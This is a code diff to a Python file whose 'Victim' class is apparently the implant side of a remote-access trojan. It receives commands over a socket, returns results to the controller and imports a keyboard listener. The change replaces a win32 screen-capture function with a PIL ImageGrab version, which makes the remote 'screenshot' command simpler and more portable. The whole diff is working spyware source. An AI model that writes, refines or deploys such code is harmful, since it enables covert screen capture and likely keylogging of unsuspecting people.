@@ -3,7 +3,7 @@ import struct
 import os
 import subprocess
 import time
-import win32gui, win32ui, win32con, win32api
+from PIL import ImageGrab
 from pynput.keyboard import Key, Listener
 
 
@@ -39,7 +39,7 @@ class Victim:
                     continue
             # 截图
             elif commlist[0] == 'screenshot':
-                screenshot_time = self.window_capture(commlist[1])
+                screenshot_time = self.capture_screenshot(commlist[1])
                 time_result = str(screenshot_time)
                 self.send_result(self.victimSocket, time_result.encode())
                 continue
@@ -147,20 +147,12 @@ class Victim:
                 break
 
     # 截图函数
-    def window_capture(self, filename):
+    def capture_screenshot(self, filename):
         beg = time.time()
-        hwnd = 0
-        hwndDC = win32gui.GetWindowDC(hwnd)
-        mfcDC = win32ui.CreateDCFromHandle(hwndDC)
-        saveDC = mfcDC.CreateCompatibleDC()
-        saveBitMap = win32ui.CreateBitmap()
-        MoniterDev = win32api.EnumDisplayMonitors(None, None)
-        w = MoniterDev[0][2][2]
-        h = MoniterDev[0][2][3]
-        saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
-        saveDC.SelectObject(saveBitMap)
-        saveDC.BitBlt((0, 0), (w, h), mfcDC, (0, 0), win32con.SRCCOPY)
-        saveBitMap.SaveBitmapFile(saveDC, filename)
+        # 截取全屏
+        screenshot = ImageGrab.grab()
+        # 保存到指定的文件
+        screenshot.save(filename)
         end = time.time()
         return (end - beg)
 
